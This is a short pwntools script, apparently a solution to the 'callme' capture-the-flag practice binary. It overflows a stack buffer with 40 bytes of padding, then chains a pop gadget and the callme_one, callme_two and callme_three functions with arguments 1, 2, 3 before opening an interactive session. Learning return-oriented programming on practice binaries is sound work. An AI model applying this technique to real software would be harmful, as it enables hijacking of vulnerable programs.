from pwn import *

e = ELF("./callme")

callmeOne = p64(e.symbols["callme_one"])
callmeTwo = p64(e.symbols["callme_two"])
callmeThree = p64(e.symbols["callme_three"])
popGadget = p64(e.symbols["usefulGadgets"])

params = p64(1) + p64(2) + p64(3)

crap = "A" * 40

payload = crap
payload += popGadget + params
payload += callmeOne
payload += popGadget + params
payload += callmeTwo
payload += popGadget + params
payload += callmeThree



io = process("./callme")


io.sendline(payload)

io.interactive()
